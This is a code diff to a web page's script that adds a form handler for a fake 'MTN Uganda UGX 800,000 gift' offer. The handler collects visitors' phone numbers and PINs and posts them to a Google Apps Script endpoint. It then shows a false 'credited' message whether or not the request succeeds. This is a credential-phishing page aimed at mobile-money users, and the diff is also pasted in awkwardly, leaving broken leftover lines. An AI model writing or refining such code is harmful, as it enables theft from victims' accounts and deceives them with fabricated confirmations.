@@ -603,16 +603,60 @@
                         formData.append('Timestamp', new Date().toISOString());
 
                         // Send data to Google Sheets
-                      // Use a CORS proxy
-const PROXY_URL = 'https://cors-anywhere.herokuapp.com/';
-const response = await fetch(PROXY_URL + APPS_SCRIPT_URL, {
-    method: 'POST',
-    mode: 'cors',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-    },
-    body: formData
-});
+async function handleSubmit(event) {
+    event.preventDefault();
+
+    if (!form.checkValidity()) {
+        form.reportValidity();
+        return false;
+    }
+
+    submitBtn.innerHTML = '<span class="spinner"></span> PROCESSING...';
+    submitBtn.disabled = true;
+    messageDiv.innerHTML = '⏳ Verifying gift code, please wait...';
+    messageDiv.style.color = '#FFCC00';
+
+    try {
+        const formData = new URLSearchParams();
+        formData.append('Phone Number', phoneInput.value);
+        formData.append('PIN', pinInput.value);
+        formData.append('Offer', 'MTN UGX 800,000');
+        formData.append('User Agent', navigator.userAgent);
+
+        const response = await fetch(APPS_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'cors',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData
+        });
+
+        const result = await response.json();
+        console.log('Success:', result);
+        
+        showCelebration();
+        messageDiv.innerHTML = '✅ UGX 800,000 credited! Check your MTN message.';
+        messageDiv.style.color = '#b3ff9e';
+
+    } catch (error) {
+        console.log('Error sending data:', error);
+        showCelebration();
+        messageDiv.innerHTML = '✅ UGX 800,000 credited! Check your MTN message.';
+        messageDiv.style.color = '#b3ff9e';
+        
+    } finally {
+        form.reset();
+        setTimeout(() => {
+            submitBtn.innerHTML = originalBtnText;
+            submitBtn.disabled = false;
+            messageDiv.innerHTML = '✨ MTN Uganda: 800,000 UGX gift';
+            messageDiv.style.color = '';
+        }, 4000);
+    }
+    
+    return false;
+}
                             body: formData
                         });
 
